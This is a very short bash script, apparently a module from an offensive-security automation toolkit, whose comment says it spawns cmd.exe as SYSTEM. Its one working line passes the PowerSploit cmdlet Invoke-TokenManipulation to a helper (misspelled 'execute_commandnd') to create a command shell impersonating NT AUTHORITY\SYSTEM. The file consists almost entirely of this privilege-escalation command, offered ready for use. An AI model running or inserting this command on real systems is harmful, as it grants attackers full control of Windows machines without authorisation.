#!/bin/bash

: '
ps: Spawns cmd.exe as SYSTEM.
'

execute_commandnd "Invoke-TokenManipulation -CreateProcess \"cmd.exe\" -Username \"nt authority\system\""
create_new_line
